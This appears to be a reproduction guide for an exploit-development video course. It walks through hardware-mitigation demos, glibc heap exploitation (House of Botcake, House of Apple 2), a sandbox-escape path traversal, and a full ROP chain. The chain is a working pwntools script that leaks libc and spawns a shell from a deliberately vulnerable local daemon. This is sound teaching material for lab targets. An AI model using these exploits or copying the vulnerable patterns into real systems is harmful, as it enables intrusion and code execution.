# Reproducing the Practical Demos — The Art of Exploit Development (Episodes 2-6)

Every terminal session shown in the videos is a real run of the code in this
repository. This guide walks through each demo exactly as it appears on
screen, so you can reproduce it on your own machine.

**Requirements:**
- Docker Desktop (all demos run in the pinned `modern-exploit-dev-lab:24.04` container)
- 4 GB free disk for the container image
- No special hardware needed — hardware-gated demos (CET/PAC/MTE) show the
  real fault behavior where hardware allows, and a simulator + disassembly
  where it doesn't (the videos explain both cases)

**One-time setup:**

```bash
git clone https://github.com/n4igme/taoxd.git
cd taoxd

# Build the pinned lab container (~5-10 min first time)
./scripts/lab.sh --build
```

All commands below run inside this container. To enter it:

```bash
./scripts/lab.sh
# you are now at /work inside the container
```

---

## Episode 2 — Hardware Strikes Back (CET / PAC / MTE)

### Demo 1: CET shadow stack — RIP overwritten, seen in the debugger

```bash
cd ch13-hwmit/cet
make shadow_stack_demo

# Run it under gdb
gdb shadow_stack_demo
```

Inside gdb:

```
(gdb) run
# → "about to smash the saved return address..."
# → Program received signal SIGSEGV
# → 0x00000000deadbeef in ?? ()

(gdb) info registers rip rsp rbp
# rip  = 0xdeadbeef   ← attacker controls the return address
# rsp  = 0x7fff...

(gdb) x/8gx $rsp
# stack dump — see the smashed frame

(gdb) print $_siginfo
# si_code = 1  (plain unmapped-address segfault)
```

**What to observe:** Without CET hardware, the overwritten RIP reaches
`0xdeadbeef` before anything catches it. On a Tiger Lake+/Zen 3+ machine,
the CPU compares the return address against the shadow stack at `RET` and
raises `si_code=10 (SEGV_CPERR)` instead — before the jump ever happens.

### Demo 2: PAC — pointer signing in a real AArch64 binary

```bash
cd ch13-hwmit/pac
aarch64-linux-gnu-gcc -O2 -march=armv8.5-a -static pac_demo.c -o pac_demo_static

# See the real instructions in the binary
aarch64-linux-gnu-objdump -d pac_demo_static | grep -E "pacia|autia|xpaci"
# 400658:  dac10293  pacia  x19, x20
# 400670:  dac143e2  xpaci  x2
# 400688:  dac11281  autia  x1, x20

# What those instructions do to a pointer (no ARM hardware needed)
python3 pac_sim.py
# raw    = 0x0000aaaaaaaa1234
# signed = 0x003caaaaaaaa1234  (PAC bits in top byte)
# xpaci  = 0x0000aaaaaaaa1234  (strip PAC, recover original)
# forged = 0x003cabaaaaaa1234  (1 bit flipped)
# autia(forged) → SIGSEGV at deref (key mismatch)
```

### Demo 3: MTE — one-byte overflow caught by a tag mismatch

```bash
cd ch13-hwmit/mte
grep -n "a\[16\]" mte_overflow.c     # the faulting line
python3 mte_sim.py
# a = 0x03000aaaaaaab2a0  (tag=0x3)
# b = 0x07000aaaaaaab2b0  (tag=0x7)
# a[16] → tag 0x3 vs memory tag 0x7 → MISMATCH → SEGV_MTESERR
```

On real ARMv8.5 hardware (Pixel 6+): compile and run `mte_overflow` —
you get a live `SIGSEGV si_code=9` on the single-byte write.

---

## Episode 3 — The Modern Heap (safe-linking + pwndbg)

```bash
cd ch14-heap-internals/safelink
make safelink
setarch -R ./safelink
# c=0x...  raw fd=0x...  reveal=0x... (expect b)
# heap base leak from tail: 0x... (== a>>12)

cd ../playground
make playground
setarch -R ./playground
```

Interactive playground (what the video drives):

```
> alloc 0
> alloc 1
> alloc 2
> alloc 3
> free 0
> free 1
> free 2
> tcache          # bin[2] count=3
> leak 2          # raw mangled fd + revealed pointer
> quit
```

Same session under pwndbg (heap visualization):

```bash
gdb -x pwndbg/walkthrough.gdb playground/playground
```

Inside pwndbg:

```
pwndbg> heap               # all chunks
pwndbg> tcachebins         # 0x40 [3]: chained
pwndbg> vis_heap_chunks    # visual map, fd auto-demangled
```

---

## Episode 4 — House Techniques (Botcake + Apple 2)

```bash
cd ch16-houses
gcc -O0 -g -no-pie -fcf-protection=none vuln.c -o vuln
cp /lib/x86_64-linux-gnu/libc.so.6 .

cd botcake
ln -sf ../vuln ./vuln
ln -sf ../libc.so.6 ./libc.so.6
python3 solve.py
# [+] heap @ 0x...      ← safe-linking leak via tail sentinel
# [+] libc @ 0x7f...    ← unsorted-bin fd leak
```

House of Apple 2 — forge the `_IO_FILE` chain:

```bash
cd ../apple2
python3 -c "
from solve import forge_apple2
payload = forge_apple2(0xdeadbeef000, 0x7f0000e3b01)
print(f'{len(payload)}-byte _IO_FILE payload forged')
"
# exit() → _IO_flush_all_lockp → __overflow → system('/bin/sh')
```

---

## Episode 5 — Browser Exploitation (sandbox escape)

```bash
cd ch23-sandbox
make

# run the full escape chain
./renderer ./exploit
# renderer (seccomp'd) → broker (privileged) → path traversal → ESCAPED
```

Check the witness:

```bash
cat /tmp/lab-sandbox/ESCAPED
# uid=0(root) — code execution outside the seccomp jail
```

The bug (worth reading):

```bash
grep -n "strncmp\|realpath\|open(" broker.c
# prefix check without canonicalization = /tmp/lab-sandbox/assets/../helpers/pwn passes
```

---

## Episode 6 — The Full Chain (stack overflow → shell)

```bash
cd ch34-fullchain/target
gcc -O0 -g -no-pie -fno-pie -fno-stack-protector notesd.c -o notesd
./notesd &
# [*] notesd listening on :9931 (no PIE — base=0x400000)
# [*] parse_header@0x401...  log_fn offset=+40
```

Watch the exploit live in gdb (second terminal):

```bash
gdb -p $(pgrep notesd)
```

```
(gdb) break parse_header
(gdb) continue
# → hit when the exploit connects
(gdb) x/8gx $rdi            # the overflow being memcpy'd
(gdb) watch *(void**)(sizeof(long)*5 + (char*)&req)   # log_fn slot
```

Run the exploit:

```bash
cd ../exploit
python3 - << 'EOF'
from pwn import *
context.arch = 'amd64'
HOST, PORT = '127.0.0.1', 9931
SYSTEM, BINSH   = 0x58750, 0x1cc42f
POP_RDI, RET_G  = 0x10c08d, 0x28a92

io = remote(HOST, PORT); io.send(b'L'); leak = io.recv(11); io.close()
libc = u64(leak[:8])
print(f'[+] libc base:   {hex(libc)}')

rop  = b'A'*32 + p64(0x20)
rop += p64(libc+POP_RDI) + p64(libc+BINSH) + p64(libc+RET_G) + p64(libc+SYSTEM)
io2 = remote(HOST, PORT); io2.send(b'N' + p16(len(rop)) + rop)
try: io2.recv(timeout=1)
except EOFError: pass
io2.close()
print('[+] log_fn → system("/bin/sh") — shell obtained')
EOF

# notesd dies with SIGSEGV: the corrupted function pointer called system()
```

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `docker: cannot connect to daemon` | Start Docker Desktop, wait for the whale icon to settle |
| `make: No rule to make target 'test'` | Use the exact commands in this guide, not `make test` |
| CET shows `si_code=1` not `10` | Expected without Tiger Lake+/Zen 3+ — the video explains both cases |
| PAC demo SIGILL under qemu | qemu-user doesn't emulate PAC — use `pac_sim.py` + objdump (as the video does) |
| `solve.py` crashes after leaks | libc offset differs from the pinned container — leaks still print, which is the demo |

## Ethics

Every artifact here is a **deliberately vulnerable teaching target** written for
this series — see [ETHICS.md](ETHICS.md). Don't point any of this at systems
you don't own.
